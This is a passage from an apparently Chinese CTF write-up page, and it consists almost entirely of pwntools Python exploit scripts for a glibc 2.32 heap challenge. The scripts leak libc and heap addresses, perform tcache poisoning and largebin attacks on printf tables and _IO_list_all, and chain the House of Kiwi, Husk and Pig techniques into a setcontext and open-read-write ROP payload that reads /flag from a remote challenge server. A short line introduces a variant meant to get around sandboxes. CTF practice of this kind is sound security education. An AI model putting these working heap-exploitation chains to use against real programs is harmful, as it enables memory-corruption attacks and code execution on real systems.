class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x398</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>orw = flat([<br>    rax,<span class="hljs-number">2</span>,rdi,heap_base + <span class="hljs-number">0xD00</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">4</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0x10</span>,read_addr,rdi,<span class="hljs-number">1</span>,write_addr<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD00</span>,<span class="hljs-string">&#x27;/flag\0&#x27;</span>,<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,orw,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>另附 shellcode 版本（避免阴间出题人沙盒拉满，<strong>侧信道，架构反复横跳</strong>，或者<strong>把 flag 藏起来</strong>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./des_heap&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br>jmp_rsi = libc_base + <span class="hljs-number">0x00000000000756fd</span><br><span class="hljs-comment"># 0x00000000000756fd: mov r13d, 1; jmp rsi;</span><br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                       